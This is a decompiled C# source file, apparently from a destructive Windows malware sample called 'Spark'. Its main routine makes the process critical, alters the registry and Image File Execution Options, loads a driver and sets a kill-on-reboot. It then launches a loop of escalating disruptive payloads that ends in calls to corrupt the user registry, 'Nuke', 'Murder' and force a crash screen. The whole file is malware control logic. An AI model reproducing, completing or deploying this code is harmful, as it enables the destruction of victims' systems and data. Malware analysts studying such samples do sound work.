// Decompiled with JetBrains decompiler
// Type: Spark.Threads
// Assembly: Spark, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2DFB06E8-4427-4218-A5F6-F5DE139079B1
// Assembly location: C:\Users\adriel\Downloads\Spark\Chris@Spark.exe

using Microsoft.Win32;
using System;
using System.Threading;
using System.Threading.Tasks;

#nullable disable
namespace Spark;

internal class Threads
{
  public static void Main()
  {
    Destructive.CriticalMode(1UL);
    RegistryEdits.GeneralChanges();
    RegistryEdits.ImageFileExecutionOptions();
    Driver.Register();
    Driver.Load();
    if (!Variables.KillOnReboot)
    {
      Files.KillOnReboot();
      Task task = Task.Run((Action) (() => Threads.StartPayloads()));
      Task.Run((Action) (() => Watchdog.CheckIFEO()));
      Thread.Sleep(180000);
      Destructive.RandomScreenOfDeath();
      task.Wait();
    }
    else
    {
      new Thread(new ThreadStart(Standard.GlitchCards)).Start();
      Thread.Sleep(5000);
      new Thread(new ThreadStart(Standard.GlitchCards)).Start();
      new Thread(new ThreadStart(Standard.PrintRotate)).Start();
      Thread.Sleep(5000);
      Destructive.Corrupt(Registry.CurrentUser);
      new Thread(new ThreadStart(Standard.GlitchCards)).Start();
      new Thread(new ThreadStart(Standard.ErrorSounds)).Start();
      new Thread(new ThreadStart(Standard.PrintRotate)).Start();
      Destructive.Nuke();
      Thread.Sleep(30000);
      Destructive.Murder();
    }
  }

  private static void LowerTimer()
  {
    if (Variables.BetweenPayloads <= 10000)
      return;
    Variables.BetweenPayloads -= 5000;
  }

  public static void StartPayloads()
  {
    while (true)
    {
      Thread.Sleep(Variables.BetweenPayloads);
      Threads.LowerTimer();
      new Thread(new ThreadStart(Standard.ErrorSounds)).Start();
      Thread.Sleep(Variables.BetweenPayloads);
      Threads.LowerTimer();
      new Thread(new ThreadStart(Standard.ShowAllWindows)).Start();
      Thread.Sleep(Variables.BetweenPayloads);
      Threads.LowerTimer();
      new Thread(new ThreadStart(Standard.SendMessagePayload)).Start();
      Thread.Sleep(Variables.BetweenPayloads);
      Threads.LowerTimer();
      new Thread(new ThreadStart(Standard.ShootingStars)).Start();
      Thread.Sleep(3000);
      new Thread(new ThreadStart(Standard.ShootingStars)).Start();
      Thread.Sleep(Variables.BetweenPayloads);
      Threads.LowerTimer();
      new Thread(new ThreadStart(Standard.GlitchCards)).Start();
      Thread.Sleep(Variables.BetweenPayloads);
      Threads.LowerTimer();
      new Thread(new ThreadStart(Standard.PrintRotate)).Start();
    }
  }
}
